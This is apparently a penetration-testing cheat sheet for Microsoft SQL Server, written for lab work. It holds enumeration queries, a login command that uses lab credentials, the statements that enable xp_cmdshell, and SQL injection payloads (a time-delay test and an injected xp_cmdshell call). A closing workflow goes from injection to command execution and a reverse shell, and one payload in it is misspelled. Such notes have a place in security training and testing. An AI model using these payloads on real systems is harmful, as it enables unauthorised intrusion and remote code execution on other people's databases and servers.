# MSSQL

- **Default port:** 1433

```bash
# Connect from Linux
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
# -windows-auth forces NTLM (not Kerberos)
```

**Basic commands:**
```sql
select @@version;
select name from sys.databases;
use <db-name>;
select table_name from information_schema.tables;
select column_name from information_schema.columns where table_name='users';
-- System objects (not in information_schema):
SELECT name FROM master..sysobjects WHERE xtype='S'
```

**Enable `xp_cmdshell`:**
```sql
EXECUTE sp_configure 'show advanced options', 1;
GO
RECONFIGURE;
GO
EXECUTE sp_configure 'xp_cmdshell', 1;
GO
```

**Time-based injection test:**
```
admin';waitfor+delay+'0:0:12'--
```

Reference: [PayloadsAllTheThings MSSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)

---

## MSSQL RCE Lab Workflow

1. Identify SQLi vulnerability
2. Verify with sleep payload: `';wait+for+delay+'0:0:10'--`
3. Enable `xp_cmdshell` (standard procedure above)
4. Verify with ping: `';EXEC+xp_cmdshell+'ping+<ip>';`
5. Execute reverse shell payload via `xp_cmdshell`
